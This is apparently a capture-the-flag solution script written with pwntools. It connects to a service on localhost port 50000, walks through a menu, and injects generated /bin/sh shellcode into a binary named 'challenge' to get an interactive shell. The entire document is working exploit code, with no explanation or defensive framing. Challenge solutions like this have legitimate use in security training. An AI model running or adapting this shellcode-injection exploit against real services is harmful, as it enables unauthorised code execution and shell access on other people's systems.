from pwn import *

context.binary = ELF("challenge")
r = remote('127.0.0.1', 50000)

r.sendline("1\n1\n1\na2")
r.sendline(str(len(asm(shellcraft.sh()))))
r.sendline(asm(shellcraft.sh()))

r.interactive()
